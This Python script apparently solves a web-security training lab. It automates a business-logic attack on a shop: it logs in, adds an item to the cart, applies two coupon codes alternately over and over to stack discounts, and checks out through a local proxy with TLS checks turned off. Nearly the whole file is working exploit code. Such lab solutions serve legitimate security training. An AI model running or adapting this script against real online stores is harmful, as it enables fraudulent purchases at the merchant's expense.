import requests
import sys
import urllib3

from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_csrf_token(url, session):
    response = session.get(
        url,
        verify=False,
        proxies=proxies)
    html = BeautifulSoup(
        response.text,
        'html.parser')
    csrf = html.find(
        "input", {'name': 'csrf'})['value']
    return csrf

def is_login_successful(url, session):
    login_url = url + "/login"
    csrf_token = get_csrf_token(
        login_url,
        session)
    data_login = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"}
    response = session.post(
        login_url,
        data=data_login,
        verify=False,
        proxies=proxies)
    return "Log out" in response.text

def is_add_to_cart_successful(url, session):
    cart_url = url + "/cart"
    data_cart = {
        "productId": "1",
        "redir": "PRODUCT",
        "quantity": "1"}
    response = session.post(
        cart_url,
        data=data_cart,
        verify=False,
        proxies=proxies)
    return response.status_code == 200

def is_add_coupon_successful(url, session):
    cart_url = url + "/cart"
    coupon_url = cart_url + "/coupon"
    success = True
    for counter in range(9):
        if counter % 2:
            csrf_token = get_csrf_token(
                cart_url,
                session)
            data_newcust5 = {
                "csrf": csrf_token,
                "coupon": "NEWCUST5"}
            response = session.post(
                coupon_url,
                data=data_newcust5,
                verify=False,
                proxies=proxies)
        else:
            csrf_token = get_csrf_token(
                cart_url,
                session)
            data_signup30 = {
                "csrf": csrf_token,
                "coupon": "SIGNUP30"}
            response = session.post(
                coupon_url,
                data=data_signup30,
                verify=False,
                proxies=proxies)
        if response.status_code != 200:
            success = False
    return success

def is_checkout_successful(url, session):
    cart_url = url + "/cart"
    checkout_csrf_token = get_csrf_token(
        cart_url, session)
    data_checkout = {
        "csrf": checkout_csrf_token}
    checkout_url = cart_url + "/checkout"
    response = session.post(
        checkout_url,
        data=data_checkout,
        verify=False,
        proxies=proxies)
    return "Congratulations" in response.text

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        session = requests.Session()
        print("[+] Starting Business Logic attack...")
        if not is_login_successful(url, session):
            print("[-] Login Failed.")
            sys.exit(FAIL)
        if not is_add_to_cart_successful(url, session):
            print("[-] Add to Cart Failed.")
            sys.exit(FAIL)
        if not is_add_coupon_successful(url, session):
            print("[-] Add Coupon Failed.")
            sys.exit(FAIL)
        if not is_checkout_successful(url, session):
            print("[-] Checkout Failed.")
            sys.exit(FAIL)
        print("[+] The Business Logic attack was successful.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Business Logic attack was not successful.")
        sys.exit(FAIL) 